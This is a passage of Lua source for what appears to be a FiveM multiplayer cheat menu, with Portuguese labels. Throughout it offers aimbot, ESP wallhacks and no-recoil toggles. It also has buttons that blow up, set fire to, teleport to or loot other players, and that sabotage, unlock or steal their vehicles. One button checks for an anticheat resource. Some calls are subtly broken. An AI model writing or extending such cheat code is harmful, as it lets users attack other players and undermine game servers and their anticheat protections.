            yvalue = yvalue + addbutton2 - 0.008

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(recoil, "No Recoil", 0.43, yvalue, function()
                    recoil = not recoil
                end)
            end


            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(R44g3b00t, "RageBot", 0.43, yvalue, function()
                    R44g3b00t = not R44g3b00t
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(A11ml00ck3, "Aimlock", 0.43, yvalue, function()
                    A11ml00ck3 = not A11ml00ck3
                end)
            end



            yvalue = yvalue + 0.008

            if yvalue >= 0.34 and yvalue <= max then
                interact.Slider("Sm00th1ng", 0.44, yvalue, 1, 0.07)
            end
        elseif psychovars.main.tab == "players" then
            local yvalue = 0.32 + scrolls["players"].static

            local addbutton = 0.045

            local addbutton2 = 0.030

            local max = 0.76

            interact.Scroll(30, "players")



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.textBox("searchPlayers", "", "Pesquisar Jogadores", 0.424, yvalue)
            end





            callfunc.callPlayersList()



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(spectar, "Spectar Player", 0.43, yvalue, function()
                    if SelectedPlayer then
                        spectar = not spectar
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Copiar Roupa", 0.424, yvalue, function()
                    if SelectedPlayer then
                        local r0_157 = GetPlayerPed(SelectedPlayer)
                        Notify("Sucesso", "camargo-sucess", "Roupa Copiada!", 255, 255, 255)
                        if DoesEntityExist(r0_157) and r0_157 ~= PlayerPedId() then
                            ClonePedToTarget(r0_157, PlayerPedId())
                        end
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Copiar ~b~Skin", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Skin Copiada!", 255, 255, 255)
                    if SelectedPlayer then
                        copiarped()
                    end
                end)
            end

            function banpl(SelectedPlayer)
                local impact, coords = GetPedLastWeaponImpactCoord(SelectedPlayer)


                if impact then
                    AddExplosion(coords.x, coords.y, coords.z, 34, 100000.0, true, false, 0.0)
                end
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Banir Player PL_PROTECT", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Player Banido!", 255, 255, 255)
                    if SelectedPlayer then
                        banpl()
                    end
                end)
            end

            function banpl2(SelectedPlayer)
                local impact, coords = GetPedLastWeaponImpactCoord(SelectedPlayer)


                if impact then
                    local pl2y3rP3d = PlayerPedId()

                    local pl3ay3rC00rds = GetEntityCoords(pl2y3rP3d)

                    local headme = GetPedBoneCoords(pl2y3rP3d, 31086)


                    local bulletSpeed = 100

                    local x2, y2, z2 = table.unpack(headme)






                    ShootSingleBulletBetweenCoords(x2, y2, z2, bulletSpeed, true,
                        "WEAPON_PISTOL_MK2", pl2y3rP3d, true, false, -1.0, true)
                end
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Banir Player PL_PROTECT 2", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Player Banido !", 255, 255, 255)
                    if SelectedPlayer then
                        banpl2()
                    end
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Teleport ~b~Jogador", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Teleportado!", 255, 255, 255)
                    if SelectedPlayer then
                        local targetPed = GetPlayerPed(SelectedPlayer)

                        if DoesEntityExist(targetPed) then
                            playerPed = PlayerPedId()

                            local x, y, z = table.unpack(GetEntityCoords(targetPed, false))


                            local veh = GetVehiclePedIsUsing(playerPed)
                            if IsPedInAnyVehicle(playerPed) then
                                playerPed = veh
                            end


                            local groundFound = false
                            local groundCheckHeights = { 0.0, 50.0, 100.0, 150.0, 200.0, 250.0, 300.0, 350.0, 400.0, 450.0, 500.0, 550.0, 600.0, 650.0, 700.0, 750.0, 800.0, 850.0, 900.0, 950.0, 1000.0, 1050.0, 1100.0 }

                            Wait(1000)

                            for _, height in ipairs(groundCheckHeights) do
                                SetEntityCoordsNoOffset(playerPed, x, y, height, 0, 0, 1)


                                RequestCollisionAtCoord(x, y, z)
                                while not HasCollisionLoadedAroundEntity(playerPed) do
                                    RequestCollisionAtCoord(x, y, z)
                                    Citizen.Wait(1)
                                end

                                Citizen.Wait(20)


                                local ground
                                ground, z = GetGroundZFor_3dCoord(x, y, height)

                                if ground then
                                    z = z + 1.0
                                    groundFound = true
                                    break
                                end
                            end


                            RequestCollisionAtCoord(x, y, z)
                            while not HasCollisionLoadedAroundEntity(playerPed) do
                                RequestCollisionAtCoord(x, y, z)
                                Citizen.Wait(1)
                            end

                            if groundFound then
                                SetEntityCoordsNoOffset(playerPed, x, y, z, 0, 0, 1)
                            else
                                print("Erro: Não foi possível encontrar o chão adequado para teleportar.")
                            end
                        end
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Teleport P2", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Teleportado P2!", 255, 255, 255)
                    if getsource('ThnAC') then
                        print("Anticheat nao suportado!")
                        return
                    end
                    if SelectedPlayer then
                        if not IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), 0) then

                        else
                            local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)

                            if IsVehicleSeatFree(veh, 0) then
                                SetPedIntoVehicle(PlayerPedId(), veh, 0)
                            elseif IsVehicleSeatFree(veh, 1) then
                                SetPedIntoVehicle(PlayerPedId(), veh, 1)
                            elseif IsVehicleSeatFree(veh, 2) then
                                SetPedIntoVehicle(PlayerPedId(), veh, 2)
                            elseif IsVehicleSeatFree(veh, 3) then
                                SetPedIntoVehicle(PlayerPedId(), veh, 3)
                            end
                        end
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Saquear Morto", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Saqueando!", 255, 255, 255)
                    if SelectedPlayer then
                        revistarplayer()
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Tacar Fogo no Player", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Fogo no Player!", 255, 255, 255)
                    if SelectedPlayer then
                        local playerPed = GetPlayerPed(SelectedPlayer)

                        local playerCds = GetEntityCoords(playerPed)

                        local x, y, z = table.unpack(playerCds)

                        AddExplosion(x, y, z, 3, 10, true, true, 1.0)



                        Wait(2)
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Explodir Player 1", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Explosao Criada!", 255, 255, 255)
                    if SelectedPlayer then
                        local playerPed = GetPlayerPed(SelectedPlayer)

                        local playerCds = GetEntityCoords(playerPed)

                        local x, y, z = table.unpack(playerCds)
                        AddExplosion(x, y, z, 59, 10, true, true, 1.0)

                        Wait(2)
                    end
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Explodir Player 2", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Explosao Criada!", 255, 255, 255)
                    if SelectedPlayer then
                        local playerPed = PlayerPedId()
                        local playerCoords = GetEntityCoords(playerPed)
                        local selectedPlayer = Selecionado

                        if selectedPlayer then
                            local targetPed = GetPlayerPed(selectedPlayer)

                            if DoesEntityExist(targetPed) then
                                local targetCoords = GetEntityCoords(targetPed)
                                local targetBoneIndex = GetPedBoneIndex(targetPed, 31086)
                                local bulletSpeed = 0

                                SetPedShootsAtCoord(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true)

                                local targetBoneCoords = GetPedBoneCoords(targetPed, targetBoneIndex)
                                local weaponHash = GetHashKey("VEHICLE_WEAPON_TANK")

                                ShootSingleBulletBetweenCoords(targetBoneCoords.x + 0.2, targetBoneCoords.y + 0.2,
                                    targetBoneCoords.z + 0.2, targetBoneCoords.x, targetBoneCoords.y, targetBoneCoords.z,
                                    bulletSpeed, true, weaponHash, playerPed, true, false, -1.0, true)
                            end
                        end
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Chuva de Veículos", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Chuva de veiculos!", 255, 255, 255)
                    if SelectedPlayer then
                        for Vehiclee in EnumerateVehicles() do
                            chuvadeveiculos(Vehiclee, SelectedPlayer)
                        end
                    end
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Grudar Veículos no Jogador", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Veiculos Grudados!", 255, 255, 255)
                    if SelectedPlayer then
                        for vehicles in EnumerateVehicles() do
                            Grudarvehsinplayer()
                        end
                    end
                end)
            end





            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Quebrar Motor", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Motor Quebrado!", 255, 255, 255)
                    killengine(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true))
                end)
            end





            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Estourar Pneus", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Pneus Estourados!", 255, 255, 255)
                    Pneus(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true))
                end)
            end
        elseif psychovars.main.tab == "vehicle" then
            callfunc.callSpawnVehicleList()





            local yvalue = 0.32 + scrolls["vehicle"].static

            local addbutton = 0.045

            local addbutton2 = 0.030

            local max = 0.76

            interact.Scroll(12, "vehicle")


            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Spawnar Veículo Selecionado (Visual)", 0.424, yvalue, function()
                    if vehicleSelected then
                        Notify("Sucesso", "camargo-sucess", "Veiculo Visual Spawnado:" .. vehicleSelected .. "!", 255, 255,
                            255)
                        vehiclemodule.Spawn(vehicleSelected, GetEntityCoords(PlayerPedId()))
                    end
                end)
            end
            if naocair22 then
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(1000)
                        SetPedCanLosePropsOnDamage(PlayerPedId(), false, 0)
                    end
                end)
            end
            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Spawnar Veículo Selecionado (Todos) [!]", 0.424, yvalue, function()
                    if vehicleSelected then
                        Notify("Sucesso", "camargo-sucess", "Veiculo (Todos) Spawnado:" .. vehicleSelected .. "!", 255, 255,
                            255)
                        vehiclemodule.Spawn(vehicleSelected, GetEntityCoords(PlayerPedId()))
                    end
                end)
            end


            if drift then
                Drift = {}
                Drift.MaxSpeed = 100.0
                Drift.BlackList = {
                    "coach",
                    "bus",
                    "coach",
                    "bus",
                    "youga2",
                    "ratloader",
                    "taxi",
                    "boxville4",
                    "trash2",
                    "tiptruck",
                    "rebel",
                    "speedo",
                    "phantom",
                    "packer",
                    "paramedicoambu",
                }

                AddEventHandler("gameEventTriggered", function(eventName, args)
                    if eventName == "CEventNetworkPlayerEnteredVehicle" then
                        if args[1] == PlayerId() then
                            Citizen.Wait(1000)
                            local ped = PlayerPedId()
                            local vehicle = GetVehiclePedIsIn(PlayerPedId())
                            for k, v in pairs(Drift.BlackList) do
                                if GetEntityModel(vehicle) == GetHashKey(v) then
                                    return
                                end
                            end
                            while IsPedInAnyVehicle(PlayerPedId()) do
                                Citizen.Wait(100)
                                local speed = GetEntitySpeed(vehicle) * 3.6
                                if GetPedInVehicleSeat(vehicle, -1) then
                                    if speed <= Drift.MaxSpeed then
                                        if IsControlPressed(1, 21) then
                                            SetVehicleReduceGrip(vehicle, true)
                                        else
                                            SetVehicleReduceGrip(vehicle, false)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end


            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(drift, "Drift com veiculo [Shift]", 0.43, yvalue, function()
                    drift = not drift
                end)
            end

            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(naocair22, "Fixar Chapeu e Capacete", 0.43, yvalue, function()
                    naocair22 = not naocair22
                end)
            end


            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Lista dos Veículos", 0.424, yvalue, function()
                    local v333h1cl33Nam33x = ""
                    Notify("Sucesso", "camargo-sucess", "Aperte F8!", 255, 255, 255)
                    for i = 1, #v3111cul00sl11st do
                        if IsModelValid(v3111cul00sl11st[i]) and IsModelAVehicle(v3111cul00sl11st[i]) then
                            v333h1cl33Nam33x = v333h1cl33Nam33x .. v3111cul00sl11st[i] .. "\n"
                        end
                    end

                    print("" .. v333h1cl33Nam33x .. "")
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Reparar Veículo", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Veiculo Reparado!", 255, 255, 255)
                    if IsPedInAnyVehicle(PlayerPedId()) then
                        SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), 0))

                        SetVehicleFixed(GetVehiclePedIsIn(PlayerPedId(), false))

                        SetVehicleDirtLevel(GetVehiclePedIsIn(PlayerPedId(), false), 0.0)

                        SetVehicleLights(GetVehiclePedIsIn(PlayerPedId(), false), 0)

                        SetVehicleBurnout(GetVehiclePedIsIn(PlayerPedId(), false), false)

                        SetVehicleLightsMode(GetVehiclePedIsIn(PlayerPedId(), false), 0)
                    end
                end)
            end





            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Tp Veículo Próximo", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Teleportado!", 255, 255, 255)
                    local vehicl3 = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 8000.0, 0, 70)

                    if vehicl3 ~= nil then
                        SetPedIntoVehicle(PlayerPedId(), vehicl3, -1)
                    end

                    if IsPedInAnyVehicle(PlayerPedId()) then

                    end
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Destrancar", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "'Destrancado'", 255, 255, 255)
                    local v3h1cl3 = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 25.0, 0, 70)

                    if DoesEntityExist(v3h1cl3) then
                        if DoesEntityExist(v3h1cl3) then
                            SetVehicleDoorsLocked(v3h1cl3, 1)

                            SetVehicleDoorsLockedForPlayer(v3h1cl3, PlayerId(), false)

                            SetVehicleDoorsLockedForAllPlayers(v3h1cl3, false)
                        end
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Trancar", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Veiculo Trancado!", 255, 255, 255)
                    local v3h1cl3 = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 25.0, 0, 70)

                    if DoesEntityExist(v3h1cl3) then
                        if DoesEntityExist(v3h1cl3) then
                            SetVehicleDoorsLocked(v3h1cl3, 1)

                            SetVehicleDoorsLockedForPlayer(v3h1cl3, PlayerId(), true)

                            SetVehicleDoorsLockedForAllPlayers(v3h1cl3, true)
                        end
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Deletar Veículo", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Veiculo Deletado!", 255, 255, 255)
                    local p333dd = PlayerPedId()

                    local inv333hp3d = IsPedInAnyVehicle(p333dd)

                    if inv333hp3d then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId()))
                    end
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Tunar ~b~(Full)", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Veiculo Tunado!", 255, 255, 255)
                    local Vehicle = GetVehiclePedIsIn(PlayerPedId(), false)

                    if DoesEntityExist(Vehicle) then
                        NetworkRequestEntityControl(Vehicle)

                        SetVehicleModKit(Vehicle, 0)

                        SetVehicleWheelType(Vehicle, 7)

                        SetVehicleMod(Vehicle, 0, GetNumVehicleMods(Vehicle, 0) - 1, false)

                        SetVehicleMod(Vehicle, 1, GetNumVehicleMods(Vehicle, 1) - 1, false)

                        SetVehicleMod(Vehicle, 2, GetNumVehicleMods(Vehicle, 2) - 1, false)

                        SetVehicleMod(Vehicle, 3, GetNumVehicleMods(Vehicle, 3) - 1, false)

                        SetVehicleMod(Vehicle, 4, GetNumVehicleMods(Vehicle, 4) - 1, false)

                        SetVehicleMod(Vehicle, 5, GetNumVehicleMods(Vehicle, 5) - 1, false)

                        SetVehicleMod(Vehicle, 6, GetNumVehicleMods(Vehicle, 6) - 1, false)

                        SetVehicleMod(Vehicle, 7, GetNumVehicleMods(Vehicle, 7) - 1, false)

                        SetVehicleMod(Vehicle, 8, GetNumVehicleMods(Vehicle, 8) - 1, false)

                        SetVehicleMod(Vehicle, 9, GetNumVehicleMods(Vehicle, 9) - 1, false)

                        SetVehicleMod(Vehicle, 10, GetNumVehicleMods(Vehicle, 10) - 1, false)

                        SetVehicleMod(Vehicle, 11, GetNumVehicleMods(Vehicle, 11) - 1, false)

                        SetVehicleMod(Vehicle, 12, GetNumVehicleMods(Vehicle, 12) - 1, false)

                        SetVehicleMod(Vehicle, 13, GetNumVehicleMods(Vehicle, 13) - 1, false)

                        SetVehicleMod(Vehicle, 15, GetNumVehicleMods(Vehicle, 15) - 2, false)

                        SetVehicleMod(Vehicle, 16, GetNumVehicleMods(Vehicle, 16) - 1, false)

                        ToggleVehicleMod(Vehicle, 17, true)

                        ToggleVehicleMod(Vehicle, 18, true)

                        ToggleVehicleMod(Vehicle, 19, true)

                        ToggleVehicleMod(Vehicle, 20, true)

                        ToggleVehicleMod(Vehicle, 21, true)

                        ToggleVehicleMod(Vehicle, 22, true)

                        SetVehicleMod(Vehicle, 25, GetNumVehicleMods(Vehicle, 25) - 1, false)

                        SetVehicleMod(Vehicle, 27, GetNumVehicleMods(Vehicle, 27) - 1, false)

                        SetVehicleMod(Vehicle, 28, GetNumVehicleMods(Vehicle, 28) - 1, false)

                        SetVehicleMod(Vehicle, 30, GetNumVehicleMods(Vehicle, 30) - 1, false)

                        SetVehicleMod(Vehicle, 33, GetNumVehicleMods(Vehicle, 33) - 1, false)

                        SetVehicleMod(Vehicle, 34, GetNumVehicleMods(Vehicle, 34) - 1, false)

                        SetVehicleMod(Vehicle, 35, GetNumVehicleMods(Vehicle, 35) - 1, false)

                        NetworkRequestControlOfEntity(PlayerPedId())

                        SetVehicleModKit(Vehicle, 0.0)

                        SetVehicleMod(Vehicle, 11, GetNumVehicleMods(Vehicle, 11) - 1, false)

                        SetVehicleMod(Vehicle, 12, GetNumVehicleMods(Vehicle, 12) - 1, false)

                        SetVehicleMod(Vehicle, 13, GetNumVehicleMods(Vehicle, 13) - 1, false)

                        SetVehicleMod(Vehicle, 15, GetNumVehicleMods(Vehicle, 15) - 2, false)

                        SetVehicleMod(Vehicle, 16, GetNumVehicleMods(Vehicle, 16) - 1, false)

                        ToggleVehicleMod(Vehicle, 17, true)

                        ToggleVehicleMod(Vehicle, 18, true)

                        ToggleVehicleMod(Vehicle, 19, true)

                        ToggleVehicleMod(Vehicle, 21, true)
                    end
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(H07nB00st33r, "Buzina Boost ~b~[E]", 0.43, yvalue, function()
                    H07nB00st33r = not H07nB00st33r
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(handling, "Handling", 0.43, yvalue, function()
                    handling = not handling

                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)

                    if not handling then
                        SetVehicleGravityAmount(veh, 9.8)

                        SetVehicleForwardSpeed(playerVeh, 1.0)
                    else
                        SetVehicleGravityAmount(veh, 30.0)
                    end
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(vehfly, "Voar com o Veículo", 0.43, yvalue, function()
                    vehfly = not vehfly
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(handling2, "Speed Boost", 0.43, yvalue, function()
                    handling2 = not handling2
                end)
            end



            yvalue = yvalue + 0.008

            if yvalue >= 0.34 and yvalue <= max then
                interact.Slider("speedboost", 0.455, yvalue, 1, 0.07)
            end





            yvalue = yvalue + addbutton2 - 0.008

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(r33pa7ra7v31cul00, "Auto Reparar", 0.43, yvalue, function()
                    r33pa7ra7v31cul00 = not r33pa7ra7v31cul00

                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1000)

                            if r33pa7ra7v31cul00 and IsPedInAnyVehicle(PlayerPedId()) then
                                local v111dav33icul00 = GetEntityHealth(GetVehiclePedIsIn(PlayerPedId()))

                                if v111dav33icul00 < 1000 then
                                    --SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), 0))

                                    SetVehicleFixed(GetVehiclePedIsIn(PlayerPedId(), false))

                                    SetVehicleDirtLevel(GetVehiclePedIsIn(PlayerPedId(), false), 0.0)

                                    SetVehicleLights(GetVehiclePedIsIn(PlayerPedId(), false), 0)

                                    SetVehicleBurnout(GetVehiclePedIsIn(PlayerPedId(), false), false)

                                    --SetVehicleLightsMode(GetVehiclePedIsIn(PlayerPedId(), false), 0)

                                    Citizen.Wait(0)
                                end
                            else
                                Citizen.Wait(1000)
                            end
                        end
                    end)
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(vehrgb, "Carro RGB", 0.43, yvalue, function()
                    vehrgb = not vehrgb
                end)
            end





            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(Pul4rc4r, "Pular com o Veículo", 0.43, yvalue, function()
                    Pul4rc4r = not Pul4rc4r
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(f0rc4rm0t0r, "Forçar Motor Ligado", 0.43, yvalue, function()
                    f0rc4rm0t0r = not f0rc4rm0t0r

                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(0)

                            if f0rc4rm0t0r and IsPedInAnyVehicle(PlayerPedId()) then
                                SetVehicleEngineOn(GetVehiclePedIsIn(PlayerPedId(), false), true, true, false)

                                -- SetVehicleLights(GetVehiclePedIsIn(PlayerPedId(), false), 3)
                            else
                                Citizen.Wait(1000)
                            end
                        end
                    end)
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(v3l0z3r0, "Atirar Dentro do Carro", 0.43, yvalue, function()
                    v3l0z3r0 = not v3l0z3r0

                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(0)

                            if v3l0z3r0 and IsPedInAnyVehicle(PlayerPedId()) then
                                EnableControlAction(0, 69, true)

                                EnableControlAction(0, 92, true)

                                SetPlayerCanDoDriveBy(PlayerId(), true)
                            else
                                Citizen.Wait(1000)
                            end
                        end
                    end)
                end)
            end





            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(naocaca, "Não Cair Da Moto", 0.43, yvalue, function()
                    naocaca = not naocaca
                    local ped = PlayerPedId()
                    if naocaca then
                        SetPedCanBeKnockedOffVehicle(ped(), true)
                    else
                        SetPedCanBeKnockedOffVehicle(ped(), false)
                    end
                end)
            end
        elseif psychovars.main.tab == "vehicles" then
            local yvalue = 0.32 + scrolls["vehicles"].static

            local addbutton = 0.045

            local addbutton2 = 0.030

            local max = 0.76

            interact.Scroll(5, "vehicles")



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.textBox("searchVehs", "", "Pesquisar Vehs", 0.424, yvalue)
            end





            callfunc.callVehicleList()





            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Tp Veículo Sel", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Teleportado ao Veiculo!", 255, 255, 255)
                    if SelectedVeh then
                        if 1 == 1 then -- if not IsVehicleSeatFree(vehiclesSelected, -1) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), SelectedVeh, -1)
                        end

                        if IsPedInAnyVehicle(PlayerPedId()) then

                        end
                    end
                end)
            end


            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Puxar Veiculo", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Veiculo Puxado!", 255, 255, 255)
                    Citizen.CreateThreadNow(function()
                        if SelectedVeh ~= nil and not IsPedInAnyVehicle(PlayerPedId()) then
                            local driver = GetPedInVehicleSeat(SelectedVeh, -1)
                            if not DoesEntityExist(driver) or IsPedAPlayer(driver) then
                                local playerCoordsBeforeTeleport = GetEntityCoords(PlayerPedId())
                                local vehicleCoordsBeforeTeleport = GetEntityCoords(SelectedVeh)

                                SetPedIntoVehicle(PlayerPedId(), SelectedVeh, -1)


                                Citizen.Wait(500)

                                SetEntityCoordsNoOffset(SelectedVeh, playerCoordsBeforeTeleport.x,
                                    playerCoordsBeforeTeleport.y, playerCoordsBeforeTeleport.z, true, true, true)

                                Citizen.Wait(2000)

                                Citizen.CreateThread(function()
                                    local inVehicle = true
                                    while inVehicle do
                                        Citizen.Wait(0)
                                        if not IsPedInAnyVehicle(PlayerPedId(), false) then
                                            inVehicle = false
                                        end
                                    end
                                end)
                            else
                                print("veiculo oculpado!")
                            end
                        end
                    end)
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Destrancar Veículo Sel", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Veiculo Destrancado!", 255, 255, 255)
                    if SelectedVeh then
                        SetVehicleDoorsLocked(SelectedVeh, 1)

                        SetVehicleDoorsLockedForPlayer(SelectedVeh, PlayerId(), false)

                        SetVehicleDoorsLockedForAllPlayers(SelectedVeh, false)
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Trancar Veículo Sel", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Veiculo Trancado!", 255, 255, 255)
                    if SelectedVeh then
                        if DoesEntityExist(SelectedVeh) then
                            SetVehicleDoorsLocked(SelectedVeh, 1)

                            SetVehicleDoorsLockedForPlayer(SelectedVeh, PlayerId(), true)

                            SetVehicleDoorsLockedForAllPlayers(SelectedVeh, true)
                        end
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Estourar Pneus Veículo ", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Pneus Estourados!", 255, 255, 255)
                    if SelectedVeh then
                        Pneus(SelectedVeh)
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Quebrar Motor Veículo ", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Motor Quebrado!", 255, 255, 255)
                    if SelectedVeh then
                        killengine(SelectedVeh)
                    end
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Clonar Placa", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Placa Clonada!", 255, 255, 255)
                    if SelectedVeh and IsPedInAnyVehicle(PlayerPedId(), 0) then
                        local plaqueta = GetVehicleNumberPlateText(SelectedVeh)

                        local car = GetVehiclePedIsUsing(PlayerPedId())

                        SetVehicleNumberPlateText(car, plaqueta)
                    end
                end)
            end







            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(ControleRemoto, "Controle Remoto Veiculos", 0.43, yvalue, function()
                    ControleRemoto = not ControleRemoto
                end)
            end
        elseif psychovars.main.tab == "visual" then
            local yvalue = 0.32 + scrolls["visual"].static

            local addbutton = 0.045

            local addbutton2 = 0.030

            local max = 0.76

            interact.Scroll(5, "visual")







            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(esp_nome, "ESP Nomes", 0.43, yvalue, function()
                    esp_nome = not esp_nome
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(esp_linhas, "ESP Linhas", 0.43, yvalue, function()
                    esp_linhas = not esp_linhas
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(espesq, "ESP Esqueletos", 0.43, yvalue, function()
                    espesq = not espesq
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(vidabarra, "ESP Vida", 0.43, yvalue, function()
                    vidabarra = not vidabarra
                end)
            end



